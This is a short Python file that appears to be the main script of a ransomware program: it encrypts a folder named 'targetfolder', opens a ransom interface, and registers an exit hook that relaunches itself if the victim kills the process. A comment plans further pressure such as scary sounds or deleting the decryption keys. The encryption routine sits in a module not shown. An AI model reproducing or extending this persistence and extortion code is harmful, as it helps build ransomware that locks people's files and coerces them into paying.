from encrypt import encrypt_folder, decrypt_folder, encrypt_file, decrypt_file
from ui import RansomwareUI, execute_gui
import atexit
import os
import sys


def relaunch_program():
    os.system("python ransomware.py -relaunch")


def main():
    atexit.register(relaunch_program)
    shell_arguments = sys.argv
    if len(shell_arguments) >= 2 and shell_arguments[1] == '-relaunch':
        # In a case the user manages to kill the process, re-launch it, but don't encrypt again.
        # There also needs to be some kind of escalation here - perhaps scary sounds or
        # reduction for the deletion of the keys
        print("not encrypting folder (relaunching)")
    else:
        print("encrypting the folder")
        encrypt_folder("targetfolder")
    execute_gui(RansomwareUI, theme='dark')


if __name__ == '__main__':
    main()
